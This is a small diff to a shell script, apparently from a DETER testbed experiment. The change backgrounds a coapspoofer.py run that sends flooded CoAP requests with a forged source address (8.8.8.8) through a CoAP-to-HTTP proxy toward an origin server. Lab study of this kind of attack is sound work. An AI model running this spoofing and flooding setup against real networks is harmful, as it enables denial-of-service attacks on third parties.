@@ -7,7 +7,7 @@ touch $TMP_DATA/$ATTACKER_LOGNAME
 
 my_ip="8.8.8.8"
 
-python3 $DETER_HOME/coapspoofer.py \
+(python3 $DETER_HOME/coapspoofer.py \
   --debug \
   --source $my_ip \
   --src-port 7123 \
@@ -18,7 +18,7 @@ python3 $DETER_HOME/coapspoofer.py \
   --uri-host $PROXY_IP \
   --uri-path coap2http \
   --proxy-uri http://$ORIGIN_SERVER_IP:8000 \
-  --flood True > $TMP_DATA/$ATTACKER_LOGNAME
+  --flood True > $TMP_DATA/$ATTACKER_LOGNAME) &
 
 spoofer_pid=$!
 
